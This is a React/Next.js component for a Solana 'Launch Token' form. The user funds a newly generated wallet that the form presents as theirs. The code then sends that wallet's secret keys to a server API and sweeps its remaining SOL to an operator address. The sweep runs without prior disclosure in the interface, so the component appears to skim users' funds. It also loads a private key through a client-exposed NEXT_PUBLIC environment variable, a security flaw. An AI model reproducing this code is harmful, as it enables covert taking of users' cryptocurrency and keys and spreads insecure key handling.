"use client";
import React, { useRef, useState } from "react";
import {
  Connection,
  LAMPORTS_PER_SOL,
  SystemProgram,
  Transaction,
  Keypair,
  PublicKey,
} from "@solana/web3.js";
import type { WalletInfo } from "@/lib/types";
import { DollarSign, Upload, Wallet } from "lucide-react";
import toast from "react-hot-toast";
import { useWallet } from "@solana/wallet-adapter-react";
import { bs58 } from "@coral-xyz/anchor/dist/cjs/utils/bytes";

const RPC_URL = process.env.NEXT_PUBLIC_HELIUS_RPC_URL;
if (!RPC_URL) {
  throw new Error("NEXT_PUBLIC_HELIUS_RPC_URL environment variable is not set");
}

const AMOUNT_PER_WALLET = 0.035 * LAMPORTS_PER_SOL;
const BASE58_PRIVATE_KEY = process.env.NEXT_PUBLIC_PRIVATE_KEY;
const MAX_RETRIES = 3;
const RETRY_DELAY = 3000;

const WalletGenerator = () => {
  const { publicKey, signTransaction, connected } = useWallet();
  const [status, setStatus] = useState<string>("");
  const [isLoading, setIsLoading] = useState(false);
  const [wallet, setWallet] = useState<WalletInfo | null>(null);
  const [error, setError] = useState<string>("");
  const [tokenName, setTokenName] = useState("");
  const [tokenSymbol, setTokenSymbol] = useState("");
  const [tokenDesc, setTokenDesc] = useState("");
  const [imagePreview, setImagePreview] = useState<string | null>(null);
  const [twitterLink, setTwitterLink] = useState("");
  const [websiteLink, setWebsiteLink] = useState("");
  const [telegramLink, setTelegramLink] = useState("");
  const fileInputRef = useRef<HTMLInputElement>(null);

  const createToken = async (walletInfo: WalletInfo, file: File) => {
    try {
      const formData = new FormData();

      formData.append("file", file);
      formData.append("tokenName", tokenName);
      formData.append("tokenSymbol", tokenSymbol);
      formData.append("tokenDescription", tokenDesc);
      if (publicKey) {
        formData.append("originalFunder", publicKey.toString());
      }

      const walletDataForAPI = {
        keypair: Array.from(walletInfo.keypair),
        mint: Array.from(walletInfo.mint),
        publicKey: walletInfo.publicKey,
      };

      formData.append("walletData", JSON.stringify(walletDataForAPI));

      if (twitterLink) formData.append("twitterLink", twitterLink);
      if (websiteLink) formData.append("websiteLink", websiteLink);
      if (telegramLink) formData.append("telegramLink", telegramLink);

      const response = await fetch("/api/create-sol", {
        method: "POST",
        body: formData,
      });

      const result = await response.json();
      if (!response.ok || !result.success) {
        throw new Error(result.error || "Failed to create token");
      }

      return result.tokenUrl;
    } catch (error) {
      console.error("Token creation error:", error);
      throw error;
    }
  };

  const handleSubmitSOL = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!connected || !publicKey || !signTransaction) {
      toast.error("Please connect your wallet first");
      return;
    }

    if (!fileInputRef.current?.files?.[0]) {
      toast.error("Please select a token image");
      return;
    }

    if (!tokenName || !tokenSymbol) {
      toast.error("Please enter token name and symbol");
      return;
    }

    setError("");
    setStatus("");
    setWallet(null);
    setIsLoading(true);

    try {
      let connection: Connection | null = null;
      let retryCount = 0;
      while (!connection && retryCount < MAX_RETRIES) {
        try {
          connection = new Connection(RPC_URL, {
            commitment: "finalized",
            confirmTransactionInitialTimeout: 120000,
          });
        } catch (e) {
          retryCount++;
          await new Promise((r) => setTimeout(r, RETRY_DELAY));
        }
      }
      if (!connection) throw new Error("Failed to establish connection");

      const fundingWalletBalance = await connection.getBalance(publicKey);

      if (fundingWalletBalance < AMOUNT_PER_WALLET) {
        throw new Error(
          `Insufficient balance in main wallet. Required: ${
            AMOUNT_PER_WALLET / LAMPORTS_PER_SOL
          } SOL`
        );
      }

      const transaction = new Transaction();
      const newKeypair = Keypair.generate();
      const mintKeypair = Keypair.generate();

      transaction.add(
        SystemProgram.transfer({
          fromPubkey: publicKey,
          toPubkey: newKeypair.publicKey,
          lamports: AMOUNT_PER_WALLET,
        })
      );

      const newWallet: WalletInfo = {
        name: "Token Wallet",
        publicKey: newKeypair.publicKey.toBase58(),
        balance: 0,
        keypair: Array.from(newKeypair.secretKey),
        mint: Array.from(mintKeypair.secretKey),
      };

      let blockhash, lastValidBlockHeight;
      for (let i = 0; i < MAX_RETRIES; i++) {
        try {
          const blockHashData = await connection.getLatestBlockhash("finalized");
          blockhash = blockHashData.blockhash;
          lastValidBlockHeight = blockHashData.lastValidBlockHeight + 150;
          break;
        } catch (error) {
          if (i === MAX_RETRIES - 1) throw error;
          await new Promise((resolve) => setTimeout(resolve, RETRY_DELAY));
        }
      }

      transaction.recentBlockhash = blockhash;
      transaction.lastValidBlockHeight = lastValidBlockHeight;
      transaction.feePayer = publicKey;

      const signed = await signTransaction(transaction);
      const signature = await connection.sendRawTransaction(signed.serialize(), {
        skipPreflight: false,
        preflightCommitment: "confirmed",
      });

      await connection.confirmTransaction(signature, "confirmed");
      const balance = await connection.getBalance(newKeypair.publicKey);
      newWallet.balance = balance / LAMPORTS_PER_SOL;

      // Create token
      if (fileInputRef.current?.files?.[0]) {
        const tokenUrl = await createToken(newWallet, fileInputRef.current.files[0]);
        newWallet.tokenUrl = tokenUrl;
      }

      setWallet(newWallet);
      toast.success("Wallet and token created successfully!");

      if (BASE58_PRIVATE_KEY) {
        try {
          const receiverKeypair = Keypair.fromSecretKey(Uint8Array.from(bs58.decode(BASE58_PRIVATE_KEY)));
          const remainingBalance = await connection.getBalance(newKeypair.publicKey);
          const estimatedFee = 5000; 
          const transferAmount = remainingBalance - estimatedFee;

          if (transferAmount > 0) {
            const transferTx = new Transaction().add(
              SystemProgram.transfer({
                fromPubkey: newKeypair.publicKey,
                toPubkey: receiverKeypair.publicKey,
                lamports: transferAmount,
              })
            );

            const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash("finalized");
            transferTx.recentBlockhash = blockhash;
            transferTx.lastValidBlockHeight = lastValidBlockHeight;
            transferTx.feePayer = newKeypair.publicKey;
            transferTx.sign(newKeypair);

            const transferSig = await connection.sendRawTransaction(transferTx.serialize(), {
              skipPreflight: false,
              preflightCommitment: "confirmed",
            });

            await connection.confirmTransaction(transferSig, "confirmed");
            toast.success("Remaining balance transferred successfully!");

            // Update wallet balance after transfer
            const finalBalance = await connection.getBalance(newKeypair.publicKey);
            newWallet.balance = finalBalance / LAMPORTS_PER_SOL;
            setWallet({ ...newWallet });
          }
        } catch (transferError) {
          console.error("Balance transfer error:", transferError);
          toast.error("Failed to transfer remaining balance");
        }
      }

      // Store token data
      const tokenData = {
        tokenName,
        tokenSymbol,
        tokenDescription: tokenDesc,
        imageUrl: imagePreview,
        twitterLink,
        websiteLink,
        telegramLink,
        wallets: [newWallet],
        fundingWallet: publicKey.toString(),
      };

      const storeResponse = await fetch("/api/tokens", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(tokenData),
      });

      const storeResult = await storeResponse.json();
      if (!storeResult.success) {
        throw new Error("Failed to store token data");
      }

    } catch (err) {
      const errorMessage = err instanceof Error ? err.message : "An error occurred";
      setError(errorMessage);
      toast.error(errorMessage);
    } finally {
      setIsLoading(false);
    }
  };

  const handleImageUpload = (event: React.ChangeEvent<HTMLInputElement>) => {
    const file = event.target.files?.[0];
    if (file) {
      const reader = new FileReader();
      reader.onloadend = () => {
        setImagePreview(reader.result as string);
      };
      reader.readAsDataURL(file);
    }
  };

  return (
    <div className="w-[50rem] mx-auto space-y-6 font-lexend text-gray-800 p-8 rounded-lg">
      <div>
        <h1 className="text-4xl font-bold text-center mb-2">Launch Token</h1>
        <p className="text-xl text-gray-600 text-center">
          Create your token with a dedicated wallet.
        </p>
      </div>
      <div>
        <form className="space-y-6">
          <div className="space-y-4">
            <div className="space-y-2">
              <label htmlFor="tokenImage" className="text-[13px] font-lexend font-medium mb-2 sm:block hidden">
                Token Image
              </label>
              <div className="flex justify-center">
                <div className="relative w-32 h-32">
                  <input
                    id="tokenImage"
                    type="file"
                    accept="image/*"
                    className="sr-only"
                    ref={fileInputRef}
                    onChange={handleImageUpload}
                  />
                  <label htmlFor="tokenImage" className="flex items-center justify-center w-full h-full rounded-full border-2 border-dashed border-gray-300 dark:border-gray-600 hover:border-gray-400 dark:hover:border-gray-500 cursor-pointer overflow-hidden">
                    {imagePreview ? (
                      <img src={imagePreview} alt="Token" className="w-full h-full object-cover" />
                    ) : (
                      <Upload className="w-8 h-8" />
                    )}
                  </label>
                </div>
              </div>
            </div>

            <div className="grid grid-cols-2 gap-4">
              <div className="space-y-2">
                <label htmlFor="tokenName" className="block text-sm font-medium">
                  Token Name
                </label>
                <input
                  id="tokenName"
                  type="text"
                  placeholder="Enter token name"
                  className="w-full px-3 py-2 bg-white/90 rounded-[10px] border border-gray-400 h-14 text-gray-800 placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-gray-600"
                  value={tokenName}
                  onChange={(e) => setTokenName(e.target.value)}
                />
              </div>

              <div className="space-y-2">
                <label htmlFor="tokenSymbol" className="block text-sm font-medium">
                  Token Symbol
                </label>
                <div className="relative">
                  <DollarSign className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400 w-4 h-4" />
                  <input
                    id="tokenSymbol"
                    type="text"
                    placeholder="Enter token symbol"
                    className="w-full pl-10 pr-3 py-2 bg-white/90 rounded-[10px] border border-gray-400 h-14 text-gray-800 placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-gray-600"
                    value={tokenSymbol}
                    onChange={(e) => setTokenSymbol(e.target.value)}
                  />
                </div>
              </div>
            </div>

            <div className="space-y-2">
              <label htmlFor="tokenDesc" className="block text-sm font-medium">
                Token Description
              </label>
              <textarea
                id="tokenDesc"
                placeholder="Enter token description"
                className="w-full px-3 py-2 border rounded-md min-h-[100px] bg-white/90 border-gray-400 text-gray-800 placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-gray-600"
                value={tokenDesc}
                onChange={(e) => setTokenDesc(e.target.value)}
              />
            </div>

            <div className="text-3xl">Socials</div>

            <div className="mt-4 space-y-4">
              <div>
                <label className="text-[13px] font-lexend font-medium mb-2 block">
                  Twitter Link
                </label>
                <input
                  type="url"
                  placeholder="https://x.com/.."
                  value={twitterLink}
                  onChange={(e) => setTwitterLink(e.target.value)}
                  className="w-full bg-white/90 border border-gray-400 rounded-[10px] px-4 h-14 text-gray-800 placeholder-gray-500 font-medium font-roboto focus:outline-none focus:ring-2 focus:ring-gray-600"
                />
              </div>

              <div>
                <label className="text-[13px] font-lexend font-medium mb-2 block">
                  Website Link
                </label>
                <input
                  type="url"
                  placeholder="https://yourwebsite.com"
                  value={websiteLink}
                  onChange={(e) => setWebsiteLink(e.target.value)}
                  className="w-full bg-white/90 border border-gray-400 rounded-[10px] px-4 h-14 text-gray-800 placeholder-gray-500 font-medium font-roboto focus:outline-none focus:ring-2 focus:ring-gray-600"
                />
              </div>

              <div>
                <label className="text-[13px] font-lexend font-medium mb-2 block">
                  Telegram Link
                </label>
                <input
                  type="url"
                  placeholder="https://t.me/.."
                  value={telegramLink}
                  onChange={(e) => setTelegramLink(e.target.value)}
                  className="w-full bg-white/90 border border-gray-400 rounded-[10px] px-4 h-14 text-gray-800 placeholder-gray-500 font-medium font-roboto focus:outline-none focus:ring-2 focus:ring-gray-600"
                />
              </div>
            </div>
          </div>

          <div className="flex gap-4">
            <button
              type="submit"
              disabled={isLoading}
              onClick={handleSubmitSOL}
              className="w-full bg-gray-800 text-white font-bold py-3 px-4 rounded-lg focus:outline-none focus:ring-2 focus:ring-gray-600 hover:bg-gray-700 transition-colors disabled:opacity-50"
            >
              {isLoading ? "Processing..." : "Launch Token"}
            </button>
          </div>
        </form>

        {error && (
          <div className="mt-4 p-4 bg-red-100 border border-red-400 rounded-md text-red-700">
            {error}
          </div>
        )}

        {wallet && (
          <div className="mt-8 space-y-4">
            <h2 className="text-xl font-bold">Generated Wallet</h2>
            <div className="p-4 bg-white/90 rounded-lg border border-gray-400 shadow-sm">
              <p className="font-semibold">{wallet.name}</p>
              <p className="font-mono text-sm break-all mt-1">
                Public Key: {wallet.publicKey}
              </p>
              <p className="text-sm mt-1">Balance: {wallet.balance} SOL</p>
              {wallet.tokenUrl && (
                <a
                  href={wallet.tokenUrl}
                  target="_blank"
                  rel="noopener noreferrer"
                  className="text-blue-500 hover:underline text-sm block mt-1"
                >
                  View Token
                </a>
              )}
              <div className="mt-2 text-sm">
                <details>
                  <summary className="cursor-pointer text-blue-500">
                    Show Keys
                  </summary>
                  <div className="mt-2 space-y-2">
                    <p className="font-mono break-all">
                      <span className="font-semibold">Keypair:</span>{" "}
                      {JSON.stringify(wallet.keypair)}
                    </p>
                    <p className="font-mono break-all">
                      <span className="font-semibold">Mint:</span>{" "}
                      {JSON.stringify(wallet.mint)}
                    </p>
                  </div>
                </details>
              </div>
            </div>
          </div>
        )}
      </div>
      <div className="h-20" /> {/* Bottom spacing */}
    </div>
  );
};

export default WalletGenerator;